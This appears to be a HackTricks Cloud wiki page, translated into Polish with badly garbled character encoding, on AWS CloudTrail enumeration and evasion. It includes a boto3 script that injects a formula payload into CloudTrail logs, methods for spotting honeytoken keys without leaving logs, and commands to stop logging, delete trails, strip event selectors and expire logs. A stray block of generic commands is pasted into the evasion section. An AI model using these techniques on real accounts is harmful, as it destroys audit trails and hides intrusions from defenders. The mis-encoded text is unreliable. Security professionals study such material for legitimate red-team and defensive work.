# AWS - CloudTrail Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail **rejestruje i monitoruje aktywnoÅ›Ä‡ w Twoim Å›rodowisku AWS**. Zbiera szczegÃ³Å‚owe **logi zdarzeÅ„**, w tym kto, co, kiedy i skÄ…d, dla wszystkich interakcji z zasobami AWS. Zapewnia to Å›cieÅ¼kÄ™ audytu zmian i dziaÅ‚aÅ„, wspomagajÄ…c analizÄ™ bezpieczeÅ„stwa, audyt zgodnoÅ›ci i Å›ledzenie zmian zasobÃ³w. CloudTrail jest niezbÄ™dny do zrozumienia zachowaÅ„ uÅ¼ytkownikÃ³w i zasobÃ³w, poprawy postawy bezpieczeÅ„stwa i zapewnienia zgodnoÅ›ci z przepisami.

KaÅ¼de zarejestrowane zdarzenie zawiera:

* NazwÄ™ wywoÅ‚anego API: `eventName`
* WywoÅ‚anÄ… usÅ‚ugÄ™: `eventSource`
* Czas: `eventTime`
* Adres IP: `SourceIPAddress`
* MetodÄ™ agenta: `userAgent`. PrzykÅ‚ady:
* Signing.amazonaws.com - Z AWS Management Console
* console.amazonaws.com - UÅ¼ytkownik root konta
* lambda.amazonaws.com - AWS Lambda
* Parametry Å¼Ä…dania: `requestParameters`
* Elementy odpowiedzi: `responseElements`

Zdarzenia sÄ… zapisywane do nowego pliku logu **mniej wiÄ™cej co 5 minut w pliku JSON**, sÄ… przechowywane przez CloudTrail, a ostatecznie pliki logÃ³w sÄ… **dostarczane do S3 okoÅ‚o 15 minut pÃ³Åºniej**.\
Logi CloudTrail mogÄ… byÄ‡ **agregowane miÄ™dzy kontami i regionami.**\
CloudTrail pozwala na uÅ¼ycie **integralnoÅ›ci plikÃ³w logÃ³w, aby mÃ³c zweryfikowaÄ‡, Å¼e Twoje pliki logÃ³w nie zostaÅ‚y zmienione** od momentu ich dostarczenia przez CloudTrail. Tworzy SHA-256 hash logÃ³w wewnÄ…trz pliku digest. SHA-256 hash nowych logÃ³w jest tworzony co godzinÄ™.\
Podczas tworzenia Trail selektory zdarzeÅ„ pozwolÄ… Ci wskazaÄ‡, ktÃ³re zdarzenia majÄ… byÄ‡ logowane: zarzÄ…dzanie, dane lub wglÄ…d.

Logi sÄ… zapisywane w wiadrze S3. DomyÅ›lnie uÅ¼ywane jest szyfrowanie po stronie serwera (SSE-S3), wiÄ™c AWS odszyfruje zawartoÅ›Ä‡ dla osÃ³b, ktÃ³re majÄ… do niej dostÄ™p, ale dla dodatkowego bezpieczeÅ„stwa moÅ¼esz uÅ¼yÄ‡ SSE z KMS i wÅ‚asnymi kluczami.

Logi sÄ… przechowywane w **wiadrze S3 o nastÄ™pujÄ…cym formacie nazwy**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Nazwa wiadra: **`aws-cloudtrail-logs-<accountid>-<random>`**
* PrzykÅ‚ad: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

WewnÄ…trz kaÅ¼dego folderu kaÅ¼dy log bÄ™dzie miaÅ‚ **nazwÄ™ w nastÄ™pujÄ…cym formacie**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Konwencja nazewnictwa plikÃ³w logÃ³w

![](<../../../../.gitbook/assets/image (122).png>)

Ponadto, **pliki digest (do sprawdzania integralnoÅ›ci plikÃ³w)** bÄ™dÄ… w **tym samym wiadrze** w:

![](<../../../../.gitbook/assets/image (195).png>)

### Agregowanie logÃ³w z wielu kont

* UtwÃ³rz Trial na koncie AWS, na ktÃ³re chcesz dostarczaÄ‡ pliki logÃ³w
* Zastosuj uprawnienia do docelowego wiadra S3, umoÅ¼liwiajÄ…c dostÄ™p miÄ™dzy kontami dla CloudTrail i pozwÃ³l kaÅ¼demu kontu AWS, ktÃ³re potrzebuje dostÄ™pu
* UtwÃ³rz nowy Trail na innych kontach AWS i wybierz uÅ¼ycie utworzonego wiadra w kroku 1

JednakÅ¼e, nawet jeÅ›li moÅ¼esz zapisaÄ‡ wszystkie logi w tym samym wiadrze S3, nie moÅ¼esz agregowaÄ‡ logÃ³w CloudTrail z wielu kont do CloudWatch Logs naleÅ¼Ä…cych do jednego konta AWS.

{% hint style="danger" %}
PamiÄ™taj, Å¼e konto moÅ¼e mieÄ‡ **rÃ³Å¼ne Trails** z CloudTrail **wÅ‚Ä…czone** przechowujÄ…ce te same (lub rÃ³Å¼ne) logi w rÃ³Å¼nych wiadrach.
{% endhint %}

### Cloudtrail ze wszystkich kont organizacji do jednego

Podczas tworzenia CloudTrail, moÅ¼liwe jest wskazanie, aby aktywowaÄ‡ cloudtrail dla wszystkich kont w organizacji i uzyskaÄ‡ logi w jednym wiadrze:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

W ten sposÃ³b moÅ¼esz Å‚atwo skonfigurowaÄ‡ CloudTrail we wszystkich regionach wszystkich kont i scentralizowaÄ‡ logi na jednym koncie (ktÃ³re powinieneÅ› chroniÄ‡).

### Sprawdzanie plikÃ³w logÃ³w

MoÅ¼esz sprawdziÄ‡, czy logi nie zostaÅ‚y zmienione, uruchamiajÄ…c

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Logs to CloudWatch

**CloudTrail moÅ¼e automatycznie wysyÅ‚aÄ‡ logi do CloudWatch, dziÄ™ki czemu moÅ¼esz ustawiÄ‡ alerty ostrzegajÄ…ce o podejrzanych dziaÅ‚aniach.**\
NaleÅ¼y pamiÄ™taÄ‡, Å¼e aby CloudTrail mÃ³gÅ‚ wysyÅ‚aÄ‡ logi do CloudWatch, musi zostaÄ‡ utworzona **rola**, ktÃ³ra na to pozwala. JeÅ›li to moÅ¼liwe, zaleca siÄ™ uÅ¼ycie domyÅ›lnej roli AWS do wykonywania tych dziaÅ‚aÅ„. Ta rola pozwoli CloudTrail na:

* CreateLogStream: Pozwala na tworzenie strumieni logÃ³w CloudWatch Logs
* PutLogEvents: Dostarczanie logÃ³w CloudTrail do strumienia logÃ³w CloudWatch Logs

### Event History

CloudTrail Event History pozwala na przeglÄ…danie w tabeli logÃ³w, ktÃ³re zostaÅ‚y zarejestrowane:

![](<../../../../.gitbook/assets/image (89).png>)

### Insights

**CloudTrail Insights** automatycznie **analizuje** zdarzenia zarzÄ…dzania zapisem z tras CloudTrail i **ostrzega** o **nietypowej aktywnoÅ›ci**. Na przykÅ‚ad, jeÅ›li nastÄ…pi wzrost zdarzeÅ„ `TerminateInstance`, ktÃ³ry rÃ³Å¼ni siÄ™ od ustalonych bazowych wartoÅ›ci, zobaczysz to jako zdarzenie Insight. Te zdarzenia sprawiajÄ…, Å¼e **znalezienie i reagowanie na nietypowÄ… aktywnoÅ›Ä‡ API jest Å‚atwiejsze** niÅ¼ kiedykolwiek.

Wnioski sÄ… przechowywane w tym samym bucket co logi CloudTrail w: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Security

| CloudTrail Log File Integrity        | <ul><li>SprawdÅº, czy logi zostaÅ‚y zmodyfikowane lub usuniÄ™te</li><li><p>UÅ¼ywa plikÃ³w digest (tworzy hash dla kaÅ¼dego pliku)</p><ul><li>SHA-256 hashing</li><li>SHA-256 z RSA do podpisu cyfrowego</li><li>klucz prywatny naleÅ¼Ä…cy do Amazon</li></ul></li><li>Tworzenie pliku digest trwa 1 godzinÄ™ (co godzinÄ™)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Stop unauthorized access             | <ul><li><p>UÅ¼yj polityk IAM i polityk bucket S3</p><ul><li>zespÃ³Å‚ bezpieczeÅ„stwa â€”> dostÄ™p administracyjny</li><li>audytorzy â€”> dostÄ™p tylko do odczytu</li></ul></li><li>UÅ¼yj SSE-S3/SSE-KMS do szyfrowania logÃ³w</li></ul>                                                                                                                                        |
| Prevent log files from being deleted | <ul><li>Ogranicz dostÄ™p do usuwania za pomocÄ… polityk IAM i polityk bucket</li><li>Skonfiguruj S3 MFA delete</li><li>SprawdÅº za pomocÄ… Log File Validation</li></ul>                                                                                                                                                                                            |

## Access Advisor

AWS Access Advisor opiera siÄ™ na ostatnich 400 dniach logÃ³w AWS **CloudTrail, aby zebraÄ‡ swoje wnioski**. CloudTrail rejestruje historiÄ™ wywoÅ‚aÅ„ API AWS i powiÄ…zanych zdarzeÅ„ w koncie AWS. Access Advisor wykorzystuje te dane, aby **pokazaÄ‡, kiedy usÅ‚ugi byÅ‚y ostatnio uÅ¼ywane**. AnalizujÄ…c logi CloudTrail, Access Advisor moÅ¼e okreÅ›liÄ‡, ktÃ³re usÅ‚ugi AWS uÅ¼ytkownik IAM lub rola uzyskaÅ‚y dostÄ™p i kiedy ten dostÄ™p miaÅ‚ miejsce. Pomaga to administratorom AWS podejmowaÄ‡ Å›wiadome decyzje dotyczÄ…ce **doprecyzowania uprawnieÅ„**, poniewaÅ¼ mogÄ… zidentyfikowaÄ‡ usÅ‚ugi, ktÃ³re nie byÅ‚y uÅ¼ywane przez dÅ‚uÅ¼szy czas i potencjalnie zmniejszyÄ‡ zbyt szerokie uprawnienia na podstawie rzeczywistych wzorcÃ³w uÅ¼ytkowania.

{% hint style="success" %}
Dlatego Access Advisor informuje o **niepotrzebnych uprawnieniach przyznanych uÅ¼ytkownikom**, aby administrator mÃ³gÅ‚ je usunÄ…Ä‡
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Actions

### Enumeration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

MoÅ¼liwe jest przeprowadzenie ataku CSV injection w CloudTrail, ktÃ³ry wykona dowolny kod, jeÅ›li logi zostanÄ… wyeksportowane w formacie CSV i otwarte w Excelu.\
PoniÅ¼szy kod wygeneruje wpis logu z nieprawidÅ‚owÄ… nazwÄ… Trail zawierajÄ…cÄ… payload:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
For more information about CSV Injections check the page:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

For more information about this specific technique check [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Bypass Detection**

### HoneyTokens **bypass**

Honeyokens sÄ… tworzone, aby **wykrywaÄ‡ wyciek wraÅ¼liwych informacji**. W przypadku AWS sÄ… to **klucze AWS, ktÃ³rych uÅ¼ycie jest monitorowane**, jeÅ›li coÅ› wywoÅ‚a dziaÅ‚anie z tym kluczem, to ktoÅ› musiaÅ‚ ukraÅ›Ä‡ ten klucz.

Jednak Honeytokens, takie jak te stworzone przez [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) uÅ¼ywajÄ… albo rozpoznawalnej nazwy konta, albo tego samego ID konta AWS dla wszystkich swoich klientÃ³w. Dlatego, jeÅ›li moÅ¼esz uzyskaÄ‡ nazwÄ™ konta i/lub ID konta bez tworzenia jakiegokolwiek logu przez Cloudtrail, **moÅ¼esz dowiedzieÄ‡ siÄ™, czy klucz jest honeytokenem, czy nie**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) ma kilka reguÅ‚ do wykrywania, czy klucz naleÅ¼y do [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* JeÅ›li **`canarytokens.org`** pojawia siÄ™ w nazwie roli lub ID konta **`534261010715`** pojawia siÄ™ w komunikacie o bÅ‚Ä™dzie.
* TestujÄ…c je bardziej niedawno, uÅ¼ywajÄ… konta **`717712589309`** i nadal majÄ… ciÄ…g **`canarytokens.com`** w nazwie.
* JeÅ›li **`SpaceCrab`** pojawia siÄ™ w nazwie roli w komunikacie o bÅ‚Ä™dzie.
* **SpaceSiren** uÅ¼ywa **uuids** do generowania nazw uÅ¼ytkownikÃ³w: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* JeÅ›li **nazwa wyglÄ…da na losowo wygenerowanÄ…**, istnieje duÅ¼e prawdopodobieÅ„stwo, Å¼e jest to HoneyToken.

#### Uzyskaj ID konta z ID klucza

MoÅ¼esz uzyskaÄ‡ **ID konta** z **zakodowanego** wewnÄ…trz **klucza dostÄ™pu**, jak [**wyjaÅ›niono tutaj**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) i sprawdziÄ‡ ID konta z listÄ… kont Honeytokens AWS:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
SprawdÅº wiÄ™cej informacji w [**oryginalnym badaniu**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### Nie generuj logu

Najbardziej efektywna technika jest w rzeczywistoÅ›ci prosta. Po prostu uÅ¼yj klucza, ktÃ³ry wÅ‚aÅ›nie znalazÅ‚eÅ›, aby uzyskaÄ‡ dostÄ™p do jakiejÅ› usÅ‚ugi w swoim wÅ‚asnym koncie atakujÄ…cego. To sprawi, Å¼e **CloudTrail wygeneruje log w TWOIM WÅASNYM koncie AWS, a nie w koncie ofiary**.

Rzecz w tym, Å¼e wynik pokaÅ¼e bÅ‚Ä…d wskazujÄ…cy ID konta i nazwÄ™ konta, wiÄ™c **bÄ™dziesz mÃ³gÅ‚ zobaczyÄ‡, czy to jest Honeytoken**.

#### UsÅ‚ugi AWS bez logÃ³w

W przeszÅ‚oÅ›ci byÅ‚y pewne **usÅ‚ugi AWS, ktÃ³re nie wysyÅ‚aÅ‚y logÃ³w do CloudTrail** (znajdÅº [listÄ™ tutaj](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). NiektÃ³re z tych usÅ‚ug **odpowiedzÄ…** bÅ‚Ä™dem zawierajÄ…cym **ARN roli klucza**, jeÅ›li ktoÅ› nieautoryzowany (klucz honeytoken) sprÃ³buje uzyskaÄ‡ do nich dostÄ™p.

W ten sposÃ³b **atakujÄ…cy moÅ¼e uzyskaÄ‡ ARN klucza bez wywoÅ‚ywania jakiegokolwiek logu**. W ARN atakujÄ…cy moÅ¼e zobaczyÄ‡ **ID konta AWS i nazwÄ™**, Å‚atwo jest poznaÄ‡ ID i nazwy kont firm HoneyToken, wiÄ™c w ten sposÃ³b atakujÄ…cy moÅ¼e zidentyfikowaÄ‡, czy token jest HoneyToken.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
ZauwaÅ¼, Å¼e wszystkie publiczne API, ktÃ³re odkryto, Å¼e nie tworzÄ… logÃ³w CloudTrail, sÄ… teraz naprawione, wiÄ™c moÅ¼e bÄ™dziesz musiaÅ‚ znaleÅºÄ‡ swoje wÅ‚asne...

WiÄ™cej informacji znajdziesz w [**oryginalnym badaniu**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).
{% endhint %}

### DostÄ™p do infrastruktury zewnÄ™trznej

NiektÃ³re usÅ‚ugi AWS **tworzÄ… pewnÄ… infrastrukturÄ™**, takÄ… jak **bazy danych** lub **klastry Kubernetes** (EKS). UÅ¼ytkownik **komunikujÄ…cy siÄ™ bezpoÅ›rednio z tymi usÅ‚ugami** (jak API Kubernetes) **nie uÅ¼ywa API AWS**, wiÄ™c CloudTrail nie bÄ™dzie w stanie zobaczyÄ‡ tej komunikacji.

Dlatego uÅ¼ytkownik z dostÄ™pem do EKS, ktÃ³ry odkryÅ‚ URL API EKS, moÅ¼e wygenerowaÄ‡ token lokalnie i **komunikowaÄ‡ siÄ™ bezpoÅ›rednio z usÅ‚ugÄ… API bez wykrycia przez CloudTrail**.

WiÄ™cej informacji w:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modyfikowanie konfiguracji CloudTrail

#### Usuwanie Å›ladÃ³w
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Zatrzymaj trails

```bash
aws cloudtrail stop-logging --name <trail_name>
```

#### Start trails

```bash
aws cloudtrail start-logging --name <trail_name>
```

#### List trails

```bash
aws cloudtrail describe-trails
```

#### Get trail status

```bash
aws cloudtrail get-trail-status --name <trail_name>
```

#### Delete trails

```bash
aws cloudtrail delete-trail --name <trail_name>
```

#### Create trails

```bash
aws cloudtrail create-trail --name <trail_name> --s3-bucket-name <bucket_name>
```

#### Update trails

```bash
aws cloudtrail update-trail --name <trail_name> --s3-bucket-name <bucket_name>
```

#### Lookup events

```bash
aws cloudtrail lookup-events
```

#### List public keys

```bash
aws cloudtrail list-public-keys
```

#### List tags

```bash
aws cloudtrail list-tags --resource-id-list <trail_arn>
```

#### Add tags

```bash
aws cloudtrail add-tags --resource-id <trail_arn> --tags-list Key=<key>,Value=<value>
```

#### Remove tags

```bash
aws cloudtrail remove-tags --resource-id <trail_arn> --tags-list Key=<key>
```
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### WyÅ‚Ä…cz logowanie w wielu regionach

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### WyÅ‚Ä…czanie logowania przez selektory zdarzeÅ„

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

W pierwszym przykÅ‚adzie, pojedynczy selektor zdarzeÅ„ jest podany jako tablica JSON z jednym obiektem. `"ReadWriteType": "ReadOnly"` wskazuje, Å¼e **selektor zdarzeÅ„ powinien rejestrowaÄ‡ tylko zdarzenia tylko do odczytu** (wiÄ™c CloudTrail insights **nie bÄ™dzie sprawdzaÄ‡ zdarzeÅ„ zapisu** na przykÅ‚ad).

MoÅ¼esz dostosowaÄ‡ selektor zdarzeÅ„ w oparciu o swoje specyficzne wymagania.

#### Usuwanie logÃ³w za pomocÄ… polityki cyklu Å¼ycia S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modyfikacja konfiguracji Bucket

* UsuÅ„ S3 bucket
* ZmieÅ„ politykÄ™ bucket, aby odmÃ³wiÄ‡ wszelkich zapisÃ³w z usÅ‚ugi CloudTrail
* Dodaj politykÄ™ cyklu Å¼ycia do S3 bucket, aby usuwaÄ‡ obiekty
* WyÅ‚Ä…cz klucz kms uÅ¼ywany do szyfrowania logÃ³w CloudTrail

### Cloudtrail ransomware

#### S3 ransomware

MoÅ¼esz **wygenerowaÄ‡ klucz asymetryczny** i sprawiÄ‡, Å¼e **CloudTrail zaszyfruje dane** tym kluczem, a nastÄ™pnie **usunÄ…Ä‡ klucz prywatny**, aby zawartoÅ›Ä‡ CloudTrail nie mogÅ‚a zostaÄ‡ odzyskana.\
To jest zasadniczo **S3-KMS ransomware** wyjaÅ›nione w:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS ransomware**

To jest Å‚atwiejszy sposÃ³b na przeprowadzenie poprzedniego ataku z rÃ³Å¼nymi wymaganiami dotyczÄ…cymi uprawnieÅ„:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Referencje**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wspieraj HackTricks</summary>

* SprawdÅº [**plany subskrypcji**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hakerskimi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}
